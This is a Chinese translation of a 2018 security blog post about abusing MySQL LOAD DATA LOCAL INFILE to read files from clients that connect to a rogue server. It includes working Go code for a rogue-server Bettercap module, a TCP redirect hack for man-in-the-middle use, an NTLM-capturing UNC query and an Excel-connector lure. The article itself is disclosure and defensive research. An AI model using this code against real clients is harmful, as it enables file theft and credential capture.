# 如何利用MySQL LOCAL INFILE读取客户端文件

阅读量 **381298**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-04-27 15:02:22

 **x**

##### 译文声明

本文是翻译文章，文章来源：https://w00tsec.blogspot.co.uk/

原文地址：<https://w00tsec.blogspot.co.uk/2018/04/abusing-mysql-local-infile-to-read.html>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/dm/1024_510_/t016f2aaff05e2629d9.png)

## 一、前言

最近一段时间，我忙着跟[TheGoonies](https://twitter.com/thegooniesctf)小伙伴们参加[VolgaCTF 2018
CTF](https://ctftime.org/event/539/tasks/)比赛。其中有一道非常有趣的Web挑战题，我们没有在比赛中顺利解开。第二天我阅读了这道题的[write-up](https://github.com/balsn/ctf_writeup/tree/master/20180324-volgactf#corp-monitoring-unsolved-written-by-bookgin-special-thanks-to-admin-aleksey)，学到了一种非常酷的技术，可以通过`LOAD DATA INFILE`语句直接攻击MySQL客户端。

“[Corp Monitoring](https://ctftime.org/task/5642)”任务中包含一个Corporate Monitoring
API，可以验证某个服务器的FTP、Web以及MySQL服务是否在线，以测试指定的某个服务器的健康状态。连接MySQL的用户存在限制条件，我们可以根据某些查询语句（比如`SHOW
DATABASE`命令）来检查该服务的健康状态。

解决这个挑战的关键在于确定`Can Use LOAD DATA LOCAL`客户端的功能，将API指向一个恶意MySQL服务器，通过`LOAD DATA
INFILE`语句读取客户端上的任意文件。

读完write-up后，我决定检查哪些库、客户端以及Web框架可以利用这个技术。此外，我还编写了一个Bettercap模块，可以配合MITM攻击方法来滥用这个功能。

![](https://p3.ssl.qhimg.com/t018dc69eb229176eef.png)

## 二、已有研究成果

在开始介绍之前，我得跟大家说明这并不是一项新的技术：这是MySQL客户端的一种已知技术，并且已经有了相关文档。我收集了先前的一些文章、工具以及演示文档，但这些资料都使用俄语编写，貌似大家并不是特别了解这些技术。

我收集的资料如下：

  * [Database Honeypot by design](https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927) – Yuri Goltsev的演示文稿（2013年8月）
  * [Rogue-MySql-Server Tool](https://github.com/allyshka/Rogue-MySql-Server) – 伪造的MySQL服务器，可以读取已连接客户端的文件（2013年9月）
  * [MySQL connect file read](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/) – Russian Security的一篇文章（2016年4月）
  * 

## 三、回顾MySQL LOAD DATA INFILE

根据MySQL的[官方文档](https://dev.mysql.com/doc/internals/en/connection-phase.html)，连接握手阶段中会执行如下操作：

  * 客户端和服务端交换各自功能
  * 如果需要则创建SSL通信通道
  * 服务端认证客户端身份

身份认证通过后，客户端会在实际操作之前发送请求，等待服务器的响应。“Client Capabilities”报文中包括名为`Can Use LOAD
DATA LOCAL`的一个条目：

![](https://p0.ssl.qhimg.com/t01e4d26ce2e35c4dac.png)

从现在起事情变得有趣起来。一旦客户端启用了这个功能（比如通过`--enable-local-infile`标志），文件就可以从运行MySQL客户端的那台主机中读取并传输到远程服务器上。

![](https://p0.ssl.qhimg.com/t013387f3b0b42c4e2b.png)

MySQL协议中比较特别的一点就是客户端并不会去记录已请求的命令，而是根据服务器的响应来执行查询。

这意味着恶意MySQL服务器可以模拟初始握手过程，等待SQL语句数据包，忽略这个数据包然后响应一个`LOCAL DATA
INFILE`请求。是不是觉得非常酷？

为了利用这个功能，客户端至少还需要向我们的恶意MySQL服务器发出一个查询请求。幸运的是，大多数MySQL客户端以及程序库都会在握手之后至少发送一次请求，以探测目标平台的指纹信息，比如（`select
@[@version_comment](https://github.com/version_comment "@version_comment")
limit 1`）。

![](https://p3.ssl.qhimg.com/t01dcde92bdcedbc834.png)

由于大多数MySQL客户端并没有强制使用加密，因此我们很容易就可以使用类似[Bettercap](https://github.com/bettercap/bettercap)之类的工具来模拟一个MySQL服务器。客户端并不关心通信的完整性以及真实性。

## 四、MITM + Bettercap + 恶意MySQL服务器

[Bettercap](https://github.com/bettercap/bettercap)就像是网络攻击以及监控的瑞士军刀。该工具支持多种[模块](https://github.com/bettercap/bettercap/tree/master/modules)，比如ARP/DNS欺骗、TCP以及数据包代理等。我快速查看了该工具中模块的工作原理，构造了一个比较简单的MySQL服务器，可以滥用`LOAD
DATA LOCAL INFILE`功能来读取客户端文件。

首先，当客户端连接并请求读取`LOCAL
INFILE`时，我嗅探了该过程的MySQL流量。我将服务器的响应数据以字节数组形式导出，使用Go语言代码定义了一些组件：

    
    
    MySQLGreeting := []byte{
        0x5b, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x36,
        0x2e, 0x32, 0x38, 0x2d, 0x30, 0x75, 0x62, 0x75,
        0x6e, 0x74, 0x75, 0x30, 0x2e, 0x31, 0x34, 0x2e,
        0x30, 0x34, 0x2e, 0x31, 0x00, 0x2d, 0x00, 0x00,
        0x00, 0x40, 0x3f, 0x59, 0x26, 0x4b, 0x2b, 0x34,
        0x60, 0x00, 0xff, 0xf7, 0x08, 0x02, 0x00, 0x7f,
        0x80, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x68, 0x69, 0x59, 0x5f,
        0x52, 0x5f, 0x63, 0x55, 0x60, 0x64, 0x53, 0x52,
        0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e,
        0x61, 0x74, 0x69, 0x76, 0x65, 0x5f, 0x70, 0x61,
        0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x00,
    }
    FirstResponseOK := []byte{
        0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02,
        0x00, 0x00, 0x00,
    }
    
    FileNameLength := byte(len(mysql.infile) + 1)
    GetFile := []byte{
        FileNameLength, 0x00, 0x00, 0x01, 0xfb,
    }
    GetFile = append(GetFile, mysql.infile...)
    
    SecondResponseOK := []byte{
        0x07, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02,
        0x00, 0x00, 0x00,
    }
    

编写Bettercap模块非常简单，恶意MySQL服务器的关键代码如下所示：

    
    
    for mysql.Running() {
    
        // tcp listener
        conn, err := mysql.listener.AcceptTCP()
        if err != nil {
            log.Warning("Error while accepting TCP connection: %s", err)
            continue
        }
    
        // send the mysql greeting
        conn.Write([]byte(MySQLGreeting))
    
        // read the incoming responses and retrieve infile
        // TODO: include binary support and files > 16kb
        b := make([]byte, 16384)
        bufio.NewReader(conn).Read(b)
    
        // parse client capabilities and validate connection
        // TODO: parse mysql connections properly and
        //       display additional connection attributes
        clientCapabilities := fmt.Sprintf("%08b", (int(uint32(b[4]) | uint32(b[5])<<8)))
        if len(clientCapabilities) == 16 {
        remoteAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]
        log.Info("MySQL connection from: %s", remoteAddress)
        loadData := string(clientCapabilities[8])
        log.Info("Can Use LOAD DATA LOCAL: %s", loadData)
        username := bytes.Split(b[36:], []byte{0})[0]
        log.Info("MySQL Login Request Username: %s", username)
    
        // send initial responseOK
        conn.Write([]byte(FirstResponseOK))
        bufio.NewReader(conn).Read(b)
        conn.Write([]byte(GetFile))
        infileLen, err := bufio.NewReader(conn).Read(b)
        if err != nil {
            log.Warning("Error while reading buffer: %s", err)
            continue
        }
    
        // check if the infile is an UNC path
        if strings.HasPrefix(mysql.infile, "\") {
            log.Info("NTLM from '%s' relayed to %s", remoteAddress, mysql.infile)
        } else {
            // print the infile content, ignore mysql protocol headers
            // TODO: include binary support and output to a file
            log.Info("Retrieving '%s' from %s (%d bytes)n%s", mysql.infile, remoteAddress, infileLen-9, string(b)[4:infileLen-4])
        }
    
        // send additional response
        conn.Write([]byte(SecondResponseOK))
        bufio.NewReader(conn).Read(b)
    
        }
        defer conn.Close()
        (...)
    

模块的执行效果如下所示：

![](https://p0.ssl.qhimg.com/t0187cb56fc416936ae.png)

模块包含如下选项：

![](https://p4.ssl.qhimg.com/t011ccde63f4171f46f.png)

值得一提的是，`INFILE`格式同样支持UNC路径，如果我们的恶意MySQL服务器运行在Windows系统上，我们还有可能使用如下查询语句获取net-NTLM哈希值：

    
    
    LOAD DATA LOCAL INFILE '\\172.16.136.153\test' into table mysql.test FIELDS TERMINATED BY "n";
    

演示该技术的示例视频如下所示：

<http://v.youku.com/v_show/id_XMzU2NDczNDYyMA==.html>

如果我们在网络中有较高权限，可以执行DNS或者ARP欺骗攻击，那么我们还可以将MySQL流量从合法的数据库重定向到我们自己的恶意服务器，然后再读取客户端上的任意文件。

目前就我所知，单单使用Bettercap时我们无法简单地将TCP流量从主机A重定向到主机B。我稍微修改了[tcp_proxy.go](https://github.com/bettercap/bettercap/blob/master/modules/tcp_proxy.go)源码，这样就能处理这种情况：

    
    
    func (p *TcpProxy) handleConnection(c *net.TCPConn) {
        defer c.Close()
    
        log.Info("TCP proxy got a connection from %s", c.RemoteAddr().String())
    
        /////////////////////////////////////////////////////////
        // Quick hack to redirect TCP traffic to our rogue server
        redirAddress := "192.168.1.124"
        redirPort := 3306
        p.remoteAddr, _ = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", redirAddress, redirPort))
        // end of hack
        /////////////////////////////////////////////////////////
    
        remote, err := net.DialTCP("tcp", nil, p.remoteAddr)
        if err != nil {
            log.Warning("Error while connecting to remote %s: %s", p.remoteAddr.String(), err)
            return
        }
        defer remote.Close()
    
        wg := sync.WaitGroup{}
        wg.Add(2)
    
        // start pipeing
        go p.doPipe(c.RemoteAddr(), p.remoteAddr, c, remote, &wg)
        go p.doPipe(p.remoteAddr, c.RemoteAddr(), remote, c, &wg)
    
        wg.Wait()
    }
    

ARP欺骗以及MySQL `LOAD DATA LOCAL INFILE`的实际效果如以下视频所示：

<http://v.youku.com/v_show/id_XMzU2NDc0ODc2NA==.html>

我向该项目发起了一个pull请求，添加MySQL恶意服务器功能，希望@evilsocket能接受该请求。如果pull请求被接受，我还想询问他们转发TCP流量的最好方式（是否可以使用另一个模块或者设置TCP代理选项）。一旦官方给出解决方案，我会及时更新这篇文章。

## 五、MySQL命令行客户端

通过Homebrew/macOS安装的mysql客户端（mysql: stable 5.7.21, devel 8.0.4-rc）正确处理了`LOCAL-INFILE`标志，除非我们显式启用该标志，否则无法读取客户端文件：

![](https://p2.ssl.qhimg.com/t01d9c06e64842a351e.png)

处于某种原因，某些客户端（如Ubuntu默认的mysql-client，本文撰写时版本号为5.7.21-0ubuntu0.17.10.1）会在连接过程中自动设置这个标志：

![](https://p1.ssl.qhimg.com/t01d2a0272af5176f29.png)

Windows上MySQL Workbench绑定的客户端同样存在这种情况，我们不需要启用这个标志就能读取本地文件：

![](https://p0.ssl.qhimg.com/t014a15a3e3f2e4b54e.png)

## 六、滥用Web框架读取服务器文件

某些程序库、Web框架以及MySQL connectors（连接器）中同样默认存在这种不安全行为：这些目标中大多数会默认启用`LOCAL-INFILE`标志。在这种情况下，当某个Web用户修改包含MySQL主机的一个表单（form），将其指向恶意服务器时，他就可以读取系统上的本地文件。

这个功能在Monitor类或者Dashboard类应用以及框架的安装脚本中非常常见，用户可以使用该功能，通过管理员面板及时设置数据库。

好消息是，大多数Web应用会做些限制，只有管理员用户才能修改MySQL设置。坏消息是，我们的管理员账户很容易会被XSS/CSRF/点击劫持攻击利用。我快速调研了可以滥用的某些PHP框架，整体情况如下：

###  Joomla v3.8.7

![](https://p3.ssl.qhimg.com/t01fe1ce25e16701bee.png)

###  WordPress v4.9.5

![](https://p5.ssl.qhimg.com/t018df238a2f35166ce.png)

###  Zabbix v3.4.8

![](https://p2.ssl.qhimg.com/t01fa8642d8d7f0f252.png)

###  Drupal v8.5.2（不受影响）

![](https://p1.ssl.qhimg.com/t016150a0d6874a18ff.png)

## 七、滥用Excel MySQL Connector

如果我们在Windows主机上安装了Microsoft Office以及[MySQL
Connector/Net](https://dev.mysql.com/downloads/connector/net/)，就有可能创建连接到MySQL恶意服务器的一个电子表格。安装[Windows
MySQL
installer](https://dev.mysql.com/downloads/installer/)时默认会安装connector，如果我们使用某款工具连接或者管理MySQL数据库，或者主机上正在运行MySQL服务器时，很有可能已经安装了这个工具。

![](https://p4.ssl.qhimg.com/t01fef26b18d137d184.png)

为了创建能连接到MySQL服务器的一个文档，我们需要转到Data标签页，选择New Query>From Database>From MySQL
Database。输入服务器信息、用户名、密码、查询语句然后保存文件即可。

![](https://p5.ssl.qhimg.com/t0152060c046523c6f2.png)

如果用户从互联网上下载文件，那么需要启用文档的编辑模式才能与远程服务器交互。因为某些原因，我们需要关闭然后重新打开Excel，才能让查询语句生效。此外，Excel只会在第一次打开文件时显示安全警告信息，当用户启用外部内容时不会再提示这个信息。演示视频如下：

<http://v.youku.com/v_show/id_XMzU2NDgzNzQ3Mg==.html>

##

## 八、总结

虽然Duo Security之前披露了[BACKRONYM MySQL漏洞](https://duo.com/blog/backronym-mysql-vulnerability)，但貌似这样并没有促使人们在连接MySQL服务器时强制使用正确的加密机制。Web应用以及框架很少支持MySQL连接的加密以及TLS验证功能。未加密的协议本身并不安全，只需要提供密码散列以及成功的认证握手过程，任何人都可以成功[登录](https://github.com/cyrus-and/mysql-unsha1)服务器。

在默认情况下，MySQL库以及connectors应当使用安全模式，禁用`LOCAL-INFILE`支持。我非常喜欢[Go MySQL
Driver](https://github.com/go-sql-driver/mysql)的处理方式：它通过白名单机制支持`LOCAL-INFILE`，并且官方文档中明确指出这个功能“可能并不安全”。

蜜罐以及漏洞扫描器也可以滥用这个功能‘，如果扫描器扫描你的MySQL主机时，可以使用这个功能黑掉你的安全工具，这将是非常有趣的一件事情。如果应用程序注册了MySQL
URI处理函数，那么我们的系统很有可能因为某个网站链接就城门大开。

滥用MySQL客户端的另一种有趣的方法就是降级（downgrade）攻击，攻击者可以将目标切换成较老的、带有不安全密码认证机制的版本，然后验证目标的工作方式。但这属于另一个话题，不再赘述。

本文翻译自https://w00tsec.blogspot.co.uk/
[原文链接](https://w00tsec.blogspot.co.uk/2018/04/abusing-mysql-local-infile-to-read.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/106488](/post/id/106488)

安全客 - 有思想的安全新媒体

本文转载自:
[https://w00tsec.blogspot.co.uk/](https://w00tsec.blogspot.co.uk/2018/04/abusing-mysql-local-infile-to-read.html)

如若转载,请注明出处： <https://w00tsec.blogspot.co.uk/2018/04/abusing-mysql-local-infile-to-read.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [MySQL](/tag/MySQL)
  * [LOCAL INFILE](/tag/LOCAL INFILE)
  * [文件读取](/tag/文件读取)

 **+1** __0赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

